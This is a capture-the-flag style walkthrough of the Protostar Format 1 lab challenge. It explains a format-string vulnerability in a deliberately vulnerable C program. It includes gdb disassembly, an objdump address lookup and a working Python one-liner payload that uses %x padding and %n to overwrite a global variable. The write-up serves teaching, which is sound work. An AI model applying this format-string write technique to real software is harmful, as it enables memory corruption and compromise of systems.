# PROTOSTAR : FORMAT 1
[Protostar:Format1](https://exploit.education/protostar/format-one/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Format Strings

The above code is vulnerable to Format Strings since the **printf** function is not checking the format of the input, which can contain format specfiers starting with **%**. It can cause memory leak and memory write using **%n**.

Below is the disassembly of the **vuln()** function.
```
user@protostar:/opt/protostar/bin$ gdb -q format1
Reading symbols from /opt/protostar/bin/format1...done.
(gdb) set disassembly-flavor intel
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x18
0x080483fa <vuln+6>:    mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <vuln+9>:    mov    DWORD PTR [esp],eax
0x08048400 <vuln+12>:   call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:   mov    eax,ds:0x8049638
0x0804840a <vuln+22>:   test   eax,eax
0x0804840c <vuln+24>:   je     0x804841a <vuln+38>
0x0804840e <vuln+26>:   mov    DWORD PTR [esp],0x8048500
0x08048415 <vuln+33>:   call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:   leave  
0x0804841b <vuln+39>:   ret    
End of assembler dump.
```

Let's supply some format specifiers and check what output we get.
```
user@protostar:/opt/protostar/bin$ ./format1 %x.%x.%x
804960c.bffff7d8.8048469 
```

As you can see the format specifier **%x** leaks the stack addresses in hexadecimal format. Now lets provide the **target** variable address and get our padding right.

Before doing that let's find the address of the **target variable** using objdump.
```
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep "target"
08049638 g     O .bss   00000004              target
```

```
user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x04\x08' + '\x38\x96\x04\x08'+ '%x.'*128 + '%x.'")
88804960c.bffff658.8048469.b7fd8304.b7fd7ff4.bffff658.8048435.bffff824.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6d8.b7eadc76.2.bffff704.bffff710.b7fe1848.bffff6c0.ffffffff.b7ffeff4.804824d.1.bffff6c0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6d8.698b158d.43dfa39d.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff704.8048450.8048440.b7ff1040.bffff6fc.b7fff8f8.2.bffff81a.bffff824.0.bffff9b0.bffff9be.bffff9d2.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.178bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7fb.1f.bffffff2.f.bffff80b.0.0.0.86000000.eac74b88.a4794b33.264fe78.697c52e9.363836.0.0.2f2e0000.6d726f66.317461.8049638.user@protostar:/opt/protostar/bin$ 
```


So you can see we got our padding lets replace the last **%x** format specifier with **%n** which will write number of bytes written so far to the **target** variable address and change its value.

You see we successfully changed the **target** variable value using **Format Strings Vulnerability**.

```
user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x04\x08' + '\x38\x96\x04\x08'+ '%x.'*128 + '%n.'")
88804960c.bffff658.8048469.b7fd8304.b7fd7ff4.bffff658.8048435.bffff824.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6d8.b7eadc76.2.bffff704.bffff710.b7fe1848.bffff6c0.ffffffff.b7ffeff4.804824d.1.bffff6c0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6d8.6360bf92.49340982.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff704.8048450.8048440.b7ff1040.bffff6fc.b7fff8f8.2.bffff81a.bffff824.0.bffff9b0.bffff9be.bffff9d2.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.178bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7fb.1f.bffffff2.f.bffff80b.0.0.0.ec000000.3f1a7c06.8176ce46.88f1a6de.69cd784a.363836.0.0.2f2e0000.6d726f66.317461..you have modified the target :)
```